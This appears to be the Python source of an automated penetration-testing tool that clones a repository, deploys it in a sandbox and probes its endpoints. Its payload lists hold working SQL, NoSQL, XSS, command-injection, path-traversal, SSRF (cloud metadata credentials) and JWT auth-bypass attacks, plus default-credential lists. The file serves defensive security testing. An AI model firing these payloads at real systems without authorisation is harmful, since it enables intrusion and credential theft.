"""
Repository Penetration Testing & Security Scanner
===================================================
Deep security testing for GitHub repositories:
  1. Clone repo â†’ Upload to S3 bucket
  2. Auto-detect framework, endpoints, auth mechanisms
  3. Deploy in sandbox container (Docker)
  4. Run comprehensive penetration tests against live endpoints
  5. Test auth bypass, authorization bypass, injection payloads
  6. Return detailed vulnerability report

Supports: FastAPI, Flask, Django, Express, NestJS, Spring Boot, Rails
"""

import os
import re
import json
import time
import asyncio
import shutil
import tempfile
import subprocess
import traceback
import hashlib
import uuid
from typing import Dict, List, Optional, Any, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
from pathlib import Path
import logging

# HTTP clients
try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    import requests as sync_requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# S3 storage
try:
    from s3_storage import upload_project_to_s3, get_project_from_s3, S3_BUCKET_NAME, s3_client
    S3_AVAILABLE = True
except ImportError:
    S3_AVAILABLE = False

# Sandbox deployment
try:
    from sandbox_deployment_service import SandboxDeploymentService, SandboxStatus
    SANDBOX_AVAILABLE = True
except ImportError:
    SANDBOX_AVAILABLE = False

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# =============================================================================
# DATA MODELS
# =============================================================================

class Severity(str, Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Informational"


class TestCategory(str, Enum):
    INJECTION = "Injection"
    AUTH_BYPASS = "Authentication Bypass"
    AUTHZ_BYPASS = "Authorization Bypass"
    XSS = "Cross-Site Scripting"
    SSRF = "Server-Side Request Forgery"
    PATH_TRAVERSAL = "Path Traversal"
    IDOR = "Insecure Direct Object Reference"
    MISCONFIG = "Security Misconfiguration"
    DATA_EXPOSURE = "Sensitive Data Exposure"
    RATE_LIMIT = "Rate Limiting"
    CORS = "CORS Misconfiguration"
    HEADER_SECURITY = "Security Headers"
    FILE_UPLOAD = "File Upload"
    DESERIALIZATION = "Insecure Deserialization"
    ENDPOINT_ENUM = "Endpoint Enumeration"


@dataclass
class DiscoveredEndpoint:
    """An API endpoint discovered from source code analysis."""
    method: str  # GET, POST, PUT, DELETE, PATCH
    path: str  # /api/users, /login, etc.
    file: str  # Source file where it was found
    line: int  # Line number
    auth_required: bool = False
    auth_type: str = ""  # jwt, session, api_key, oauth, basic, none
    parameters: List[Dict[str, str]] = field(default_factory=list)  # [{name, type, location}]
    request_body_schema: Optional[Dict] = None
    description: str = ""
    framework: str = ""


@dataclass
class PentestFinding:
    """A single penetration test finding."""
    id: str
    title: str
    category: str  # TestCategory value
    severity: str  # Severity value
    endpoint: str  # The tested endpoint
    method: str  # HTTP method used
    description: str
    evidence: str  # The actual request/response that proves the vulnerability
    payload_used: str = ""
    response_code: int = 0
    response_snippet: str = ""
    remediation: str = ""
    cwe_id: str = ""
    owasp_category: str = ""
    cvss_score: float = 0.0
    false_positive_likelihood: str = "Low"  # Low, Medium, High


@dataclass 
class PentestReport:
    """Complete penetration test report."""
    repo_url: str
    scan_id: str
    started_at: str
    completed_at: str = ""
    duration_seconds: float = 0
    
    # Infrastructure
    s3_key: str = ""
    sandbox_url: str = ""
    sandbox_port: int = 0
    framework_detected: str = ""
    language_detected: str = ""
    
    # Discovery
    endpoints_discovered: List[Dict] = field(default_factory=list)
    auth_mechanisms: List[str] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    
    # Findings
    findings: List[Dict] = field(default_factory=list)
    
    # Summary
    total_tests_run: int = 0
    critical_count: int = 0
    high_count: int = 0
    medium_count: int = 0
    low_count: int = 0
    info_count: int = 0
    
    # Scores
    overall_risk_score: float = 0.0  # 0-100 (100 = most vulnerable)
    
    errors: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            "repo_url": self.repo_url,
            "scan_id": self.scan_id,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "duration_seconds": self.duration_seconds,
            "s3_key": self.s3_key,
            "sandbox_url": self.sandbox_url,
            "sandbox_port": self.sandbox_port,
            "framework_detected": self.framework_detected,
            "language_detected": self.language_detected,
            "endpoints_discovered": self.endpoints_discovered,
            "auth_mechanisms": self.auth_mechanisms,
            "technologies": self.technologies,
            "findings": self.findings,
            "total_tests_run": self.total_tests_run,
            "summary": {
                "critical": self.critical_count,
                "high": self.high_count,
                "medium": self.medium_count,
                "low": self.low_count,
                "info": self.info_count,
                "total_findings": len(self.findings)
            },
            "overall_risk_score": self.overall_risk_score,
            "errors": self.errors
        }


# =============================================================================
# ATTACK PAYLOADS DATABASE
# =============================================================================

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "1; DROP TABLE users--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "admin'--",
    "') OR ('1'='1",
    "1 OR 1=1",
    "1' OR '1'='1' UNION SELECT username, password FROM users--",
    "'; EXEC xp_cmdshell('whoami')--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
    "' HAVING 1=1--",
    "' GROUP BY columnnames HAVING 1=1--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
]

NOSQL_INJECTION_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$regex": ".*"}',
    '{"$where": "true"}',
    '{"$exists": true}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"$or": [{"a": "a"}, {"b": "b"}]}',
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<iframe src="javascript:alert(\'XSS\')">',
    '{{7*7}}',  # Template injection / SSTI
    '${7*7}',   # Template literal injection
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '"><img src=x onerror=alert("XSS")>',
    "javascript:alert('XSS')",
    '<details open ontoggle=alert("XSS")>',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert("XSS")>',
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "& ls -la",
    "`ls -la`",
    "$(ls -la)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "; id",
    "| id",
    "& whoami",
    "; ping -c 1 127.0.0.1",
    "$(whoami)",
    "`id`",
    "\n/bin/ls -la",
    ";sleep 5",
    "|sleep 5",
    "$(sleep 5)",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "../../../etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "C:\\Windows\\system32\\drivers\\etc\\hosts",
    "....//....//etc/passwd",
    "..%00/etc/passwd",
    "..;/etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "../../../app/config.py",
    "../../../.env",
    "../../../config/database.yml",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::1]",
    "http://0x7f000001",
    "http://2130706433",
    "http://localhost:22",
    "http://localhost:3306",
    "http://localhost:5432",
    "http://localhost:6379",
    "http://localhost:27017",
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "http://100.100.100.200/latest/meta-data/",  # Alibaba metadata
    "file:///etc/passwd",
    "dict://localhost:11211/stats",  # Memcached
    "gopher://localhost:6379/_INFO",  # Redis
]

AUTH_BYPASS_PAYLOADS = {
    "jwt_none_alg": {
        "description": "JWT Algorithm None Attack",
        "headers": {
            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
        }
    },
    "jwt_empty": {
        "description": "Empty JWT Token",
        "headers": {"Authorization": "Bearer "}
    },
    "jwt_malformed": {
        "description": "Malformed JWT",
        "headers": {"Authorization": "Bearer xxx.yyy.zzz"}
    },
    "basic_auth_default": {
        "description": "Default Basic Auth Credentials",
        "credentials": [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("root", "toor"),
            ("admin", "admin123"),
            ("test", "test"),
            ("user", "user"),
            ("administrator", "administrator"),
            ("admin", ""),
            ("root", ""),
            ("admin", "P@ssw0rd"),
            ("sa", "sa"),
            ("postgres", "postgres"),
        ]
    },
    "header_manipulation": {
        "description": "Auth Header Manipulation",
        "headers_list": [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Cluster-Client-IP": "127.0.0.1"},
        ]
    },
    "method_override": {
        "description": "HTTP Method Override",
        "headers_list": [
            {"X-HTTP-Method-Override": "PUT"},
            {"X-HTTP-Method": "DELETE"},
            {"X-Method-Override": "PATCH"},
        ]
    },
}

AUTHORIZATION_BYPASS_TESTS = {
    "idor_patterns": [
        # Try accessing other users' resources
        {"replace_pattern": r"/users?/\d+", "replace_with": ["/users/1", "/users/0", "/users/999", "/users/-1"]},
        {"replace_pattern": r"/profile/\d+", "replace_with": ["/profile/1", "/profile/0", "/profile/999"]},
        {"replace_pattern": r"/account/\d+", "replace_with": ["/account/1", "/account/0"]},
        {"replace_pattern": r"/order[s]?/\d+", "replace_with": ["/orders/1", "/orders/0"]},
    ],
    "privilege_escalation": {
        "role_params": ["role=admin", "is_admin=true", "isAdmin=1", "admin=1", "type=admin", "access=admin"],
        "role_bodies": [
            {"role": "admin"},
            {"is_admin": True},
            {"isAdmin": True},
            {"type": "admin"},
            {"access_level": "admin"},
            {"permissions": ["*"]},
            {"group": "administrators"},
        ]
    },
    "forced_browsing": [
        "/admin",
        "/admin/dashboard",
        "/admin/users",
        "/admin/config",
        "/admin/settings",
        "/api/admin",
        "/api/admin/users",
        "/api/internal",
        "/api/debug",
        "/api/test",
        "/api/v1/admin",
        "/api/config",
        "/api/settings",
        "/dashboard",
        "/management",
        "/console",
        "/debug",
        "/actuator",
        "/actuator/health",
        "/actuator/env",
        "/actuator/beans",
        "/.env",
        "/config.json",
        "/config.yml",
        "/swagger.json",
        "/openapi.json",
        "/api-docs",
        "/graphql",
        "/graphiql",
        "/__debug__",
        "/phpinfo.php",
        "/server-status",
        "/server-info",
        "/metrics",
        "/prometheus",
        "/health",
        "/healthcheck",
        "/status",
        "/info",
        "/docs",
        "/redoc",
    ]
}

SECURITY_HEADERS_CHECKS = {
    "required": {
        "Strict-Transport-Security": {
            "description": "HSTS header prevents downgrade attacks",
            "severity": "Medium",
            "remediation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' header"
        },
        "X-Content-Type-Options": {
            "expected": "nosniff",
            "description": "Prevents MIME type sniffing attacks",
            "severity": "Low",
            "remediation": "Add 'X-Content-Type-Options: nosniff' header"
        },
        "X-Frame-Options": {
            "expected": ["DENY", "SAMEORIGIN"],
            "description": "Prevents clickjacking attacks",
            "severity": "Medium",
            "remediation": "Add 'X-Frame-Options: DENY' or 'X-Frame-Options: SAMEORIGIN' header"
        },
        "Content-Security-Policy": {
            "description": "Controls resource loading to prevent XSS",
            "severity": "Medium",
            "remediation": "Implement Content-Security-Policy header with appropriate directives"
        },
        "X-XSS-Protection": {
            "expected": "1; mode=block",
            "description": "Enables browser XSS filter",
            "severity": "Low",
            "remediation": "Add 'X-XSS-Protection: 1; mode=block' header"
        },
        "Referrer-Policy": {
            "description": "Controls referrer information leakage",
            "severity": "Low",
            "remediation": "Add 'Referrer-Policy: strict-origin-when-cross-origin' header"
        },
        "Permissions-Policy": {
            "description": "Controls browser feature access",
            "severity": "Low",
            "remediation": "Add 'Permissions-Policy' header to restrict unnecessary browser features"
        }
    },
    "dangerous": {
        "Server": {
            "description": "Server header reveals technology stack information",
            "severity": "Low",
            "remediation": "Remove or obfuscate the Server header"
        },
        "X-Powered-By": {
            "description": "Reveals framework/technology information",
            "severity": "Low",
            "remediation": "Remove X-Powered-By header"
        },
        "X-AspNet-Version": {
            "description": "Reveals ASP.NET version",
            "severity": "Low",
            "remediation": "Remove X-AspNet-Version header"
        },
    }
}

CORS_TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
    "https://localhost",
    "http://localhost",
    "https://example.com",
]


# =============================================================================
# FRAMEWORK DETECTION
# =============================================================================

class FrameworkDetector:
    """Detects the web framework and language from repository files."""
    
    FRAMEWORK_SIGNATURES = {
        # Python frameworks
        "fastapi": {
            "files": ["main.py", "app.py", "server.py", "api.py"],
            "patterns": [r"from\s+fastapi\s+import", r"FastAPI\s*\(", r"@app\.(get|post|put|delete|patch)"],
            "language": "python",
            "default_port": 8000
        },
        "flask": {
            "files": ["app.py", "main.py", "server.py", "wsgi.py"],
            "patterns": [r"from\s+flask\s+import", r"Flask\s*\(__name__", r"@app\.route"],
            "language": "python",
            "default_port": 5000
        },
        "django": {
            "files": ["manage.py", "settings.py", "urls.py", "wsgi.py"],
            "patterns": [r"from\s+django", r"INSTALLED_APPS", r"urlpatterns"],
            "language": "python",
            "default_port": 8000
        },
        # JavaScript/TypeScript frameworks  
        "express": {
            "files": ["server.js", "app.js", "index.js", "server.ts", "app.ts"],
            "patterns": [r"require\s*\(\s*['\"]express['\"]", r"import\s+express", r"app\.(get|post|put|delete|use)\s*\("],
            "language": "javascript",
            "default_port": 3000
        },
        "nestjs": {
            "files": ["main.ts", "app.module.ts", "app.controller.ts"],
            "patterns": [r"@Module\s*\(", r"@Controller\s*\(", r"NestFactory\.create"],
            "language": "typescript",
            "default_port": 3000
        },
        "nextjs": {
            "files": ["next.config.js", "next.config.mjs", "pages/api"],
            "patterns": [r"next/server", r"NextResponse", r"export\s+default\s+function\s+handler"],
            "language": "javascript",
            "default_port": 3000
        },
        # Java frameworks
        "spring": {
            "files": ["pom.xml", "build.gradle", "Application.java"],
            "patterns": [r"@SpringBootApplication", r"@RestController", r"@RequestMapping"],
            "language": "java",
            "default_port": 8080
        },
        # Ruby frameworks
        "rails": {
            "files": ["Gemfile", "config/routes.rb", "app/controllers"],
            "patterns": [r"Rails\.application", r"class.*<\s*ApplicationController", r"resources?\s+:"],
            "language": "ruby",
            "default_port": 3000
        },
        # Go frameworks
        "gin": {
            "files": ["main.go", "go.mod"],
            "patterns": [r"github\.com/gin-gonic/gin", r"gin\.Default\(\)", r"router\.(GET|POST|PUT|DELETE)"],
            "language": "go",
            "default_port": 8080
        },
    }
    
    @classmethod
    def detect(cls, repo_dir: str) -> Dict[str, Any]:
        """Detect framework from repository directory."""
        results = {
            "framework": "unknown",
            "language": "unknown",
            "default_port": 8000,
            "confidence": 0,
            "entry_file": None,
            "has_requirements": False,
            "has_package_json": False,
            "has_dockerfile": False,
        }
        
        # Check for common config files
        if os.path.exists(os.path.join(repo_dir, "requirements.txt")):
            results["has_requirements"] = True
        if os.path.exists(os.path.join(repo_dir, "package.json")):
            results["has_package_json"] = True
        if os.path.exists(os.path.join(repo_dir, "Dockerfile")):
            results["has_dockerfile"] = True
        
        best_match = None
        best_score = 0
        
        for framework_name, sig in cls.FRAMEWORK_SIGNATURES.items():
            score = 0
            entry = None
            
            # Check for signature files
            for sig_file in sig["files"]:
                full_path = os.path.join(repo_dir, sig_file)
                if os.path.exists(full_path):
                    score += 2
                    if entry is None:
                        entry = sig_file
                # Check in subdirectories
                for root, dirs, files in os.walk(repo_dir):
                    # Skip common non-source dirs
                    dirs[:] = [d for d in dirs if d not in {'node_modules', '.git', 'venv', '__pycache__', '.venv', 'env'}]
                    if sig_file in files:
                        score += 1
                        rel_path = os.path.relpath(os.path.join(root, sig_file), repo_dir)
                        if entry is None:
                            entry = rel_path
                    if score > 3:
                        break
            
            # Check for code patterns
            for root, dirs, files in os.walk(repo_dir):
                dirs[:] = [d for d in dirs if d not in {'node_modules', '.git', 'venv', '__pycache__', '.venv', 'env', 'dist', 'build'}]
                for f in files:
                    if not f.endswith(('.py', '.js', '.ts', '.java', '.rb', '.go', '.jsx', '.tsx')):
                        continue
                    try:
                        fpath = os.path.join(root, f)
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                            content = fh.read(8192)  # Read first 8KB
                        for pattern in sig["patterns"]:
                            if re.search(pattern, content):
                                score += 3
                                if entry is None:
                                    entry = os.path.relpath(fpath, repo_dir)
                                break
                    except Exception:
                        continue
                if score > 6:
                    break
            
            if score > best_score:
                best_score = score
                best_match = (framework_name, sig, entry)
        
        if best_match and best_score >= 3:
            framework_name, sig, entry = best_match
            results["framework"] = framework_name
            results["language"] = sig["language"]
            results["default_port"] = sig["default_port"]
            results["confidence"] = min(100, best_score * 15)
            results["entry_file"] = entry
        
        return results


# =============================================================================  
# ENDPOINT DISCOVERY
# =============================================================================

class EndpointDiscovery:
    """Discovers API endpoints from source code analysis."""
    
    # Pattern definitions per framework
    FASTAPI_PATTERNS = [
        (r'@(?:app|router)\.(get|post|put|delete|patch|options|head)\s*\(\s*["\']([^"\']+)["\']', 'decorator'),
        (r'\.add_api_route\s*\(\s*["\']([^"\']+)["\'].*methods\s*=\s*\[([^\]]+)\]', 'add_route'),
    ]
    
    FLASK_PATTERNS = [
        (r'@(?:app|bp|blueprint)\.(route)\s*\(\s*["\']([^"\']+)["\'](?:.*methods\s*=\s*\[([^\]]+)\])?', 'decorator'),
    ]
    
    DJANGO_PATTERNS = [
        (r'path\s*\(\s*["\']([^"\']+)["\']', 'urlconf'),
        (r're_path\s*\(\s*["\']([^"\']+)["\']', 'urlconf'),
    ]
    
    EXPRESS_PATTERNS = [
        (r'(?:app|router)\.(get|post|put|delete|patch|all|use)\s*\(\s*["\']([^"\']+)["\']', 'method'),
    ]
    
    NESTJS_PATTERNS = [
        (r'@(Get|Post|Put|Delete|Patch)\s*\(\s*["\']?([^"\')\s]*)["\']?\s*\)', 'decorator'),
        (r'@Controller\s*\(\s*["\']([^"\']+)["\']', 'controller'),
    ]
    
    SPRING_PATTERNS = [
        (r'@(GetMapping|PostMapping|PutMapping|DeleteMapping|PatchMapping|RequestMapping)\s*\(\s*(?:value\s*=\s*)?["\']([^"\']+)["\']', 'annotation'),
    ]
    
    AUTH_INDICATORS = [
        r'@login_required', r'@jwt_required', r'@requires_auth', r'@authenticated',
        r'Depends\s*\(\s*(?:get_current_user|verify_token|auth|require_auth)',
        r'@UseGuards\s*\(', r'@PreAuthorize',
        r'passport\.(authenticate|authorize)', r'isAuthenticated',
        r'middleware.*auth', r'requireAuth', r'checkAuth',
        r'@Secured', r'@RolesAllowed',
        r'verify_jwt', r'decode_token', r'get_current_user',
    ]
    
    @classmethod
    def discover(cls, repo_dir: str, framework: str = "auto") -> List[DiscoveredEndpoint]:
        """Discover all API endpoints in the repository."""
        endpoints = []
        
        # Detection patterns by framework
        pattern_map = {
            "fastapi": cls.FASTAPI_PATTERNS,
            "flask": cls.FLASK_PATTERNS,
            "django": cls.DJANGO_PATTERNS,
            "express": cls.EXPRESS_PATTERNS,
            "nestjs": cls.NESTJS_PATTERNS,
            "spring": cls.SPRING_PATTERNS,
        }
        
        # If auto, try all patterns
        frameworks_to_try = [framework] if framework in pattern_map else list(pattern_map.keys())
        
        skip_dirs = {'node_modules', '.git', 'venv', '__pycache__', '.venv', 'env',
                     'dist', 'build', '.next', 'coverage', 'test', 'tests', '__tests__'}
        
        source_extensions = {'.py', '.js', '.ts', '.jsx', '.tsx', '.java', '.rb', '.go'}
        
        for root, dirs, files in os.walk(repo_dir):
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            
            for fname in files:
                ext = os.path.splitext(fname)[1].lower()
                if ext not in source_extensions:
                    continue
                    
                fpath = os.path.join(root, fname)
                rel_path = os.path.relpath(fpath, repo_dir)
                
                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        lines = content.split('\n')
                except Exception:
                    continue
                
                for fw in frameworks_to_try:
                    patterns = pattern_map.get(fw, [])
                    for pattern, style in patterns:
                        for match in re.finditer(pattern, content):
                            ep = cls._parse_match(match, style, fw, rel_path, content, lines)
                            if ep:
                                # Check if auth is required on this endpoint
                                ep.auth_required = cls._check_auth_required(content, match.start(), lines)
                                endpoints.append(ep)
        
        # Deduplicate by method + path
        seen = set()
        unique_endpoints = []
        for ep in endpoints:
            key = f"{ep.method}:{ep.path}"
            if key not in seen:
                seen.add(key)
                unique_endpoints.append(ep)
        
        return unique_endpoints
    
    @classmethod
    def _parse_match(cls, match, style: str, framework: str, file_path: str, 
                     content: str, lines: List[str]) -> Optional[DiscoveredEndpoint]:
        """Parse a regex match into a DiscoveredEndpoint."""
        try:
            if style == 'decorator' and framework in ('fastapi', 'express'):
                method = match.group(1).upper()
                path = match.group(2)
            elif style == 'decorator' and framework == 'nestjs':
                method = match.group(1).upper()
                path = match.group(2) if match.group(2) else "/"
            elif style == 'method':
                method = match.group(1).upper()
                if method in ('ALL', 'USE'):
                    method = 'GET'  # Default; will test multiple methods
                path = match.group(2)
            elif style == 'urlconf':
                method = 'GET'  # Django URL patterns don't specify method
                path = "/" + match.group(1).strip('/')
            elif style == 'annotation':
                annotation = match.group(1)
                method_map = {
                    'GetMapping': 'GET', 'PostMapping': 'POST', 'PutMapping': 'PUT',
                    'DeleteMapping': 'DELETE', 'PatchMapping': 'PATCH', 'RequestMapping': 'GET'
                }
                method = method_map.get(annotation, 'GET')
                path = match.group(2)
            elif style == 'add_route':
                path = match.group(1)
                methods_str = match.group(2)
                method = 'GET'
                if methods_str:
                    method = methods_str.replace("'", "").replace('"', '').split(',')[0].strip().upper()
            else:
                return None
            
            # Normalize path
            if not path.startswith('/'):
                path = '/' + path
            
            # Get line number
            line_num = content[:match.start()].count('\n') + 1
            
            # Try to detect parameters
            params = cls._extract_parameters(path, content[match.start():match.start()+500])
            
            return DiscoveredEndpoint(
                method=method,
                path=path,
                file=file_path,
                line=line_num,
                framework=framework,
                parameters=params
            )
        except Exception:
            return None
    
    @classmethod
    def _extract_parameters(cls, path: str, nearby_code: str) -> List[Dict[str, str]]:
        """Extract parameter definitions from path and nearby code."""
        params = []
        
        # Path parameters: {id}, {user_id}, :id, :userId
        for match in re.finditer(r'\{(\w+)\}|:(\w+)', path):
            name = match.group(1) or match.group(2)
            params.append({"name": name, "type": "string", "location": "path"})
        
        # Query parameters from code context
        for match in re.finditer(r'(?:query|Query)\s*\(\s*["\'](\w+)["\']', nearby_code):
            params.append({"name": match.group(1), "type": "string", "location": "query"})
        
        # Body parameters
        for match in re.finditer(r'(?:Body|body)\s*\(\s*["\']?(\w+)["\']?', nearby_code):
            params.append({"name": match.group(1), "type": "string", "location": "body"})
        
        return params
    
    @classmethod
    def _check_auth_required(cls, content: str, match_pos: int, lines: List[str]) -> bool:
        """Check if an endpoint requires authentication."""
        # Check nearby lines (within 10 lines before the endpoint)
        line_num = content[:match_pos].count('\n')
        start_line = max(0, line_num - 10)
        nearby = '\n'.join(lines[start_line:line_num + 3])
        
        for pattern in cls.AUTH_INDICATORS:
            if re.search(pattern, nearby, re.IGNORECASE):
                return True
        return False


# =============================================================================
# S3 REPO STORAGE
# =============================================================================

class RepoS3Storage:
    """Handles cloning repos and uploading to S3."""
    
    @staticmethod
    async def clone_and_upload(repo_url: str, scan_id: str) -> Tuple[str, str]:
        """
        Clone a GitHub repo, upload all files to S3, return (temp_dir, s3_prefix).
        The temp_dir is kept alive for sandbox deployment.
        """
        temp_dir = tempfile.mkdtemp(prefix=f"pentest_{scan_id}_")
        
        # Clone
        clone_url = repo_url if repo_url.endswith('.git') else repo_url + '.git'
        
        try:
            import git
            repo = git.Repo.clone_from(clone_url, temp_dir, depth=1)
            logger.info(f"Cloned {repo_url} to {temp_dir}")
        except Exception as e:
            logger.error(f"Clone failed: {e}")
            # Try with subprocess
            result = subprocess.run(
                ['git', 'clone', '--depth', '1', clone_url, temp_dir],
                capture_output=True, text=True, timeout=120
            )
            if result.returncode != 0:
                raise Exception(f"Git clone failed: {result.stderr}")
        
        # Upload to S3
        s3_prefix = ""
        if S3_AVAILABLE and S3_BUCKET_NAME:
            try:
                files_to_upload = []
                skip_dirs = {'node_modules', '.git', 'venv', '__pycache__', '.venv', 'env', 'dist', 'build'}
                
                for root, dirs, files in os.walk(temp_dir):
                    dirs[:] = [d for d in dirs if d not in skip_dirs]
                    for f in files:
                        fpath = os.path.join(root, f)
                        rel_path = os.path.relpath(fpath, temp_dir)
                        try:
                            # Skip binary files
                            with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                                content = fh.read()
                            files_to_upload.append({
                                "path": rel_path,
                                "content": content
                            })
                        except Exception:
                            continue
                
                s3_prefix = f"pentest-scans/{scan_id}"
                result = upload_project_to_s3(
                    project_slug=f"pentest-{scan_id}",
                    files=files_to_upload,
                    user_id="security-scanner"
                )
                logger.info(f"Uploaded {result.get('files_uploaded', 0)} files to S3 prefix: {s3_prefix}")
                
            except Exception as e:
                logger.warning(f"S3 upload failed (continuing without): {e}")
                s3_prefix = "s3_upload_failed"
        else:
            s3_prefix = "s3_not_configured"
        
        return temp_dir, s3_prefix


# =============================================================================
# SANDBOX DEPLOYER
# =============================================================================

class SandboxDeployer:
    """Deploys cloned repo in a sandbox container for live testing."""
    
    @staticmethod
    async def deploy(repo_dir: str, framework_info: Dict, scan_id: str) -> Tuple[Optional[str], int]:
        """
        Deploy the repo in a sandbox Docker container.
        Returns (base_url, port) or (None, 0) on failure.
        """
        if not SANDBOX_AVAILABLE:
            logger.warning("Sandbox deployment service not available")
            return None, 0
        
        try:
            sds = SandboxDeploymentService()
            
            # Read all project files
            project_files = {}
            skip_dirs = {'node_modules', '.git', 'venv', '__pycache__', '.venv', 'env'}
            
            for root, dirs, files in os.walk(repo_dir):
                dirs[:] = [d for d in dirs if d not in skip_dirs]
                for f in files:
                    fpath = os.path.join(root, f)
                    rel_path = os.path.relpath(fpath, repo_dir)
                    try:
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                            project_files[rel_path] = fh.read()
                    except Exception:
                        continue
            
            # Ensure proper entry point exists
            framework = framework_info.get("framework", "unknown")
            language = framework_info.get("language", "unknown")
            entry_file = framework_info.get("entry_file")
            
            # For Python frameworks, ensure main.py exists
            if language == "python":
                if "main.py" not in project_files and entry_file and entry_file in project_files:
                    # Create a shim main.py that imports the actual entry
                    project_files["main.py"] = f"""
# Auto-generated entry point for security testing
import sys, os
sys.path.insert(0, os.path.dirname(__file__))

# Import the actual app
try:
    from {entry_file.replace('.py', '').replace('/', '.')} import app
except ImportError:
    from fastapi import FastAPI
    app = FastAPI()
    
    @app.get("/health")
    def health():
        return {{"status": "ok"}}
"""
                # Inject /health endpoint if not present
                if "main.py" in project_files:
                    main_content = project_files["main.py"]
                    if "/health" not in main_content and "health" not in main_content:
                        main_content += """

# Injected health endpoint for security testing
@app.get("/health")
def _pentest_health_check():
    return {"status": "ok", "pentest": True}
"""
                        project_files["main.py"] = main_content
                
                # Ensure requirements.txt exists
                if "requirements.txt" not in project_files:
                    project_files["requirements.txt"] = "fastapi\nuvicorn\npydantic\n"
            
            elif language in ("javascript", "typescript"):
                # For Node.js, ensure package.json has start script
                if "package.json" in project_files:
                    try:
                        pkg = json.loads(project_files["package.json"])
                        if "scripts" not in pkg:
                            pkg["scripts"] = {}
                        if "start" not in pkg.get("scripts", {}):
                            pkg["scripts"]["start"] = "node server.js || node app.js || node index.js"
                        project_files["package.json"] = json.dumps(pkg, indent=2)
                    except json.JSONDecodeError:
                        pass
            
            # Create sandbox
            result = await sds.create_sandbox(
                session_id=f"pentest-{scan_id}",
                project_files=project_files,
                ttl_minutes=30  # 30 min for testing
            )
            
            if result and result.status in (SandboxStatus.RUNNING, SandboxStatus.HEALTHY):
                base_url = result.base_url
                port = result.port
                logger.info(f"Sandbox deployed: {base_url} (port {port})")
                return base_url, port
            else:
                error = result.error_message if result else "Unknown error"
                logger.error(f"Sandbox deployment failed: {error}")
                return None, 0
                
        except Exception as e:
            logger.error(f"Sandbox deployment error: {e}")
            logger.error(traceback.format_exc())
            return None, 0
    
    @staticmethod
    async def cleanup(scan_id: str):
        """Stop and remove the sandbox container."""
        try:
            if SANDBOX_AVAILABLE:
                sds = SandboxDeploymentService()
                await sds.stop_sandbox(f"pentest-{scan_id}")
                logger.info(f"Sandbox cleaned up for {scan_id}")
        except Exception as e:
            logger.warning(f"Sandbox cleanup error: {e}")


# =============================================================================
# PENETRATION TESTER  
# =============================================================================

class PenetrationTester:
    """Runs actual penetration tests against live endpoints."""
    
    def __init__(self, base_url: str, timeout: float = 10.0):
